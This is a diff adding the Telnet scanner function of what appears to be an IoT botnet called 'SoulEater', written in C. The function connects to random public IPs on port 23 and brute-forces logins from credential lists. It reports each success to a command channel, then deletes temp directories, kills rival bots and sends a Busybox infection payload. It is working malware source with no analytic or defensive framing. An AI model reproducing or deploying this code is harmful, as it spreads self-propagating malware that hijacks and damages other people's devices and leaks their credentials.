@@ -1,0 +1,280 @@
+void TelnetScanner(int wait_usec, int maxfds)
+{
+        int max = getdtablesize() - 100, i, res, num_tmps, j;
+       
+        char buf[128], cur_dir;
+        if (max > maxfds)
+                max = maxfds;
+        fd_set fdset;
+        struct timeval tv;
+        socklen_t lon;
+        int valopt;
+       
+       
+       
+        char line[256];
+        char* buffer;
+        struct sockaddr_in dest_addr;
+        dest_addr.sin_family = AF_INET;
+        dest_addr.sin_port = htons(23);
+        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+       
+        buffer = malloc(SOCKBUF_SIZE + 1);
+        memset(buffer, 0, SOCKBUF_SIZE + 1);
+       
+        struct telstate_t fds[max];
+       
+        memset(fds, 0, max * (sizeof(int) + 1));
+        for(i = 0; i < max; i++)
+        {
+            memset(&(fds[i]), 0, sizeof(struct telstate_t));
+            fds[i].complete = 1;
+            fds[i].sockbuf = buffer;
+        }
+        while(1) {
+                for(i = 0; i < max; i++) {
+                        if(fds[i].tTimeout == 0) {
+                                fds[i].tTimeout = time(NULL);
+                        }
+                        switch(fds[i].state) {
+            case 0:
+                {
+                    if(fds[i].complete == 1)
+                    {
+                        char *tmp = fds[i].sockbuf;
+                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
+                        fds[i].sockbuf = tmp;
+                                   
+                        fds[i].ip = getRandomPublicIP();
+                    }
+                    else if(fds[i].complete == 0)
+                    {
+                        fds[i].usernameInd++;
+                        fds[i].passwordInd++;
+                                   
+                        if(fds[i].passwordInd == sizeof(Telnet_Passwords) / sizeof(char *))
+                        {
+                            fds[i].complete = 1;
+                            continue;
+                        }
+                        if(fds[i].usernameInd == sizeof(Telnet_Usernames) / sizeof(char *))
+                        {
+                            fds[i].complete = 1;
+                            continue;
+                        }
+                    }
+                               
+                    dest_addr.sin_family = AF_INET;
+                    dest_addr.sin_port = htons(23);
+                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+                    dest_addr.sin_addr.s_addr = fds[i].ip;
+                               
+                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
+                               
+                    if(fds[i].fd == -1) continue;
+                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
+                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
+                    {
+                        reset_telstate(&fds[i]);
+                    }
+                    else
+                    {
+                        advance_telstate(&fds[i], 1);
+                    }
+                }
+                break;
+               
+            case 1:
+                {
+                    FD_ZERO(&fdset);
+                    FD_SET(fds[i].fd, &fdset);
+                    tv.tv_sec = 0;
+                    tv.tv_usec = wait_usec;
+                    res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
+                   
+                    if(res == 1) {
+                        fds[i].tTimeout = 0;
+                        lon = sizeof(int);
+                        valopt = 0;
+                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
+                        if(valopt)
+                        {
+                            reset_telstate(&fds[i]);
+                        }
+                        else
+                        {
+                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
+                            advance_telstate(&fds[i], 2);
+                        }
+                        continue;
+                    }
+                    else if(res == -1)
+                    {
+                        reset_telstate(&fds[i]);
+                        continue;
+                    }
+                    if(fds[i].tTimeout + 7 < time(NULL))
+                    {
+                        reset_telstate(&fds[i]);
+                    }
+                }
+                break;
+            case 2:
+                {
+                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
+                    {
+                        fds[i].tTimeout = time(NULL);
+                        if(contains_fail(fds[i].sockbuf))
+                        {
+                            advance_telstate(&fds[i], 0);
+                        }
+                        else
+                        {
+                            advance_telstate(&fds[i], 3);
+                        }
+                        continue;
+                    }
+                    if(fds[i].tTimeout + 7 < time(NULL))
+                    {
+                        reset_telstate(&fds[i]);
+                    }
+                }
+                break;
+            case 3:
+                {
+                    if(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], strlen(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
+                    {
+                        reset_telstate(&fds[i]);
+                        continue;
+                    }
+                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
+                    {
+                        reset_telstate(&fds[i]);
+                        continue;
+                    }
+                    advance_telstate(&fds[i], 4);
+                }
+                break;
+            case 4:
+                {
+                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
+                    {
+                        fds[i].tTimeout = time(NULL);
+                        if(contains_fail(fds[i].sockbuf))
+                        {
+                            advance_telstate(&fds[i], 0);
+                        }
+                        else
+                        {
+                            advance_telstate(&fds[i], 5);
+                        }
+                        continue;
+                    }
+                    if(fds[i].tTimeout + 7 < time(NULL))
+                    {
+                        reset_telstate(&fds[i]);
+                    }
+                }
+                break;                             
+            case 5:
+                {
+                    if(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], strlen(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
+                    {
+                        reset_telstate(&fds[i]);
+                        continue;
+                    }
+                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
+                    {
+                        reset_telstate(&fds[i]);
+                        continue;
+                    }
+                    advance_telstate(&fds[i], 6);
+                }
+                break;                                 
+            case 6:
+                {
+                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2))
+                    {
+                        fds[i].tTimeout = time(NULL);
+                       
+                        if(contains_fail(fds[i].sockbuf))
+                        {
+                            advance_telstate(&fds[i], 0);
+                        }
+                        else if(contains_success(fds[i].sockbuf))
+                        {
+                            if(fds[i].complete == 2)
+                            {
+                                advance_telstate(&fds[i], 7);
+                            }
+                            else
+                            {
+                                sockprintf(mainCommSock, "[ SoulEater ] Successfully Bruted. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
+                                advance_telstate(&fds[i], 7);
+                            }
+                        }
+                        else
+                        {
+                            reset_telstate(&fds[i]);
+                        }
+                        continue;
+                    }
+                    if(fds[i].tTimeout + 7 < time(NULL))
+                    {
+                        reset_telstate(&fds[i]);
+                    }
+                }
+                break;
+               
+            case 7:
+            {
+               
+                char RemoveTheTempDirs [80];
+                sprintf(RemoveTheTempDirs, "rm -rf %s;", Temp_Directorys);
+                if(send(fds[i].fd, RemoveTheTempDirs, strlen(RemoveTheTempDirs), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
+                RemoveTempDirs();
+                sockprintf(mainCommSock, "[ SoulEater ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
+               
+                char killtheproccesses[80];
+                sprintf(killtheproccesses, "pkill -9 %s;killall -9 %s;", Bot_Killer_Binarys, Bot_Killer_Binarys);
+                if(send(fds[i].fd, killtheproccesses, strlen(killtheproccesses), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
+                sockprintf(mainCommSock, "[ SoulEater ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
+               
+                advance_telstate(&fds[i], 8);
+            }
+            break;
+            case 8:
+                {
+                        fds[i].tTimeout = time(NULL);
+                       
+                        if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0);
+                        if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
+                       
+                        if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
+                        sockprintf(mainCommSock, "[ SoulEater ] Sending Infection Payload. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
+                       
+                       
+                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, "CONNECTED"))
+                        {
+                       
+                            if(strcasestr(fds[i].sockbuf, "CONNECTED") && fds[i].complete != 3)
+                            {
+                                sockprintf(mainCommSock, "[ SoulEater ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
+                                fds[i].complete = 3;
+                            }
+                        }
+                       
+                        if(fds[i].tTimeout + 10 < time(NULL))
+                        {
+                            if(fds[i].complete!=3)
+                            {
+                                sockprintf(mainCommSock, "[ SoulEater ] Infection Failed. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
+                            }
+                            reset_telstate(&fds[i]);
+                        }
+                        break;
+                }
+            }
+        }
+    }              
+}
